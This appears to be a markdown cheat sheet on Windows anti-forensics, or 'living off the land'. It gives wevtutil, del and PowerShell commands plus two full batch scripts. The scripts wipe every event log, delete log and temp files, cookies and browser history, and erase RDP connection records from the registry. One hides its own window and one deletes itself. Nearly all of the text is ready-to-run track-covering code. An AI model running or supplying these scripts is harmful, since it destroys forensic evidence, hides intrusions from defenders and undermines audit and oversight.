# Living off the Land

## 01 - Command Prompt

List logs.

```
C:\> wevtutil el
```

Clear logs in a specific category.

```
C:\> wevtutil cl <logname>
```

Delete all event logs.

```
C:\> for /f "tokens=*" %1 in ('wevtutil.exe el') do wevtutil.exe cl "%1"
```

Delete all logs.

```
C:\> del %WINDIR%\*.log /a /s /q /f
```

### 1.1 - Automated Batch Scripts

A batch script to wipe the files.

```batch
C:\> type wipe_log_events.bat
@echo off
timeout /t 5
for /f "tokens=1,2*" %%V in ('bcdedit') do set adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /f "tokens=*" %%G in ('wevtutil.exe el') do (call :do_clear "%%G")
echo.
echo Event Logs have been cleared!
goto theEnd
:do_clear
echo clearing %1
wevtutil.exe cl %1

goto :eof
:noAdmin
echo You must run this script as an Administrator!
echo.
:theEnd
rd /s /q %systemdrive%\$RECYCLE.BIN
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"
cd %userprofile%\documents\
attrib Default.rdp -s -h
del Default.rdp
del %0
```

Another variant of the batch to wipe all of the logs.

```batch
C:\> type wipe_all_logs.bat
:: To clean all logs in vindex I recommend to use this bootnik.
:: And even this botnick does not clean all logs, for example in the registry.
:start
cmdow @ /HID

wevtutil.exe cl Application
wevtutil.exe cl Security
wevtutil.exe cl Setup
wevtutil.exe cl System
wevtutil.exe cl ForwardedEvents
%WINDIR%\system32\rundll32.exe

FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
echo.
echo Event Logs have been cleared!
goto theEnd
:do_clear
echo clearing %1
wevtutil.exe cl %1
goto :eof
:noAdmin
echo You must run this script as an Administrator!
echo.
:theEnd



rd /s /q %systemdrive%\$RECYCLE.BIN
rd /s /q  %systemdrive%\recycler
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"
cd %userprofile%\documents\
attrib Default.rdp -s -h


DEL /S /Q /A c:\*.log
DEL /S /Q /A c:\*.tmp
DEL /F /S /Q /A "%USERPROFILE%\Roaming\Macromedia\*"
DEL /F /S /Q /A "%USERPROFILE%\Roaming\Adobe\*"
DEL /F /S /Q /A "C:\Windows\Temp\*"
DEL /F /S /Q /A "C:\Temp\*"
DEL /F /S /Q /A "%USERPROFILE%\AppData\Local\Temp\*"
DEL /F /S /Q %TEMP%\*
cd %USERPROFILE%\AppData\Local\Temp
rmdir /s /q %USERPROFILE%\AppData\Local\Temp
pushd %TEMP% && rd /s /q . > nul 2>&1
pushd %WinDir%\TEMP && rd /s /q . > nul 2>&1
pushd %TMP% && rd /s /q . > nul 2>&1
pushd %WinDir%\TMP && rd /s /q . > nul 2>&1
pushd %TEMP% && rd /s /q . > nul 2>&1
pushd %WinDir%\Temp && rd /s /q . > nul 2>&1
pushd %TMP% && rd /s /q . > nul 2>&1
pushd %WinDir%\tmp && rd /s /q . > nul 2>&1
pushd "%USERPROFILE%\Local Settings\Application Data\Temp" && rd /s /q . > nul 2>&1
pushd "%USERPROFILE%\AppData\Roaming\Adobe\" && rd /s /q . > nul 2>&1
pushd "%USERPROFILE%\Local Settings\Temporary Internet Files\" && rd /s /q . > nul 2>&1
pushd "%USERPROFILE%\Local Settings\History" && rd /s /q . > nul 2>&1
pushd %USERPROFILE%\Cookies && rd /s /q . > nul 2>&1
pushd "%USERPROFILE%\AppData\Roaming\Macromedia\Flash Player\macromedia.com\support\flashplayer\" && rd /s /q . > nul 2>&1

pushd %USERPROFILE%\Application Data\Microsoft\CryptNetURLCache\Content\ && rd /s /q . > nul 2>&1
pushd %USERPROFILE%\Application Data\Microsoft\CryptNetURLCache\MetaData\ && rd /s /q . > nul 2>&1
pushd %USERPROFILE%\Local Settings\Application Data\IconCache.db && rd /s /q . > nul 2>&1
pushd "C:\Documents and Settings\All Users\Application Data\Temp\" && rd /s /q . > nul 2>&1
pushd "C:\Documents and Settings\Default User\Cookies\" && rd /s /q . > nul 2>&1
pushd "C:\Documents and Settings\Default User\Local Settings\Temp\" && rd /s /q . > nul 2>&1
pushd "C:\Documents and Settings\Default User\Local Settings\Temporary Internet Files\" && rd /s /q . > nul 2>&1
pushd "C:\Documents and Settings\LocalService\Cookies\" && rd /s /q . > nul 2>&1
pushd "C:\Documents and Settings\LocalService\Local Settings\Temporary Internet Files\" && rd /s /q . > nul 2>&1

DEL /F /S /Q /A "%USERPROFILE%\AppData\Roaming\Download Master\temp\*"
DEL /F /S /Q /A "%USERPROFILE%\AppData\Roaming\Download Master\logs\*"

Cleanmgr /verylowdisk
```

## 02 - Powershell

Delete a specific event log.

```
PS C:\> Remove-EventLog -LogName "Application"
Remove-EventLog -LogName "Security"
Remove-EventLog -LogName "System"
```

Clear multiple event logs.

```
PS C:\> Clear-Eventlog -Log Application,Security,System

PS C:\> Clear-Eventlog -Log Application,Security,System -Confirm

PS C:\> Get-WinEvent -ListLog Application,Security,System -Force | % { Wevtutil.exe cl $_.Logname }
```

Delete all event logs.

```
PS C:\> Get-WinEvent -ListLog * | where {$_.RecordCount} | ForEach-Object -Process { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName) }

PS C:\> Get-WinEvent -ListLog * -Force | % { Wevtutil.exe cl $_.LogName }

PS C:\> wevtutil el | Foreach-Object {Write-Host "Clearing $($_)" -ForegroundColor Green ; Wevtutil.exe cl "$_"}
```

TODO: Get all event logs to each specific event category

`PS C:\> Get-WinEvent -FilterHashTable @{LogName="Application"; ID=}`

```
PS C:\> Get-WinEvent -FilterHashTable @{LogName="Microsoft-Windows-Terminal-Services-RemoteConnectionManager/Operational"; ID=1149}
```

```
PS C:\> Get-WinEvent -FilterHashTable @{LogName="Microsoft-Windows-Powershell/Operational"; ID=4100,4103,4104,}
```

```
PS C:\> Get-WinEvent -FilterHashTable @{LogName="Microsoft-Windows-TerminalServices-Gateway"; ID=400,800}
```

```
PS C:\> Get-WinEvent -FilterHashTable @{LogName="Security"; ID=1102,4624,4625,4634,4647,4648,4657,4658,4661,4663,4672,4674,4688,4697,4720,4722,4732,4738,4768,4769,4776,4778,4779,4782,5712}
```

```
PS C:\> Get-WinEvent -FilterHashTable @{LogName="System"; ID=7030,7036,7045,10000,100001,20001,20002,20003,24756,24577,24579}
```

---
## References

- [Event Log Tampering Part 1 Disrupting The Eventlog Service](https://svch0st.medium.com/event-log-tampering-part-1-disrupting-the-eventlog-service-8d4b7d67335c)

- [Microsoft Powershell Management Powershell 7.2](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/remove-event?view=powershell-7.2)

- [Microsoft Powershell Management Powershell 5.1](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/remove-eventlog?view=powershell-5.1)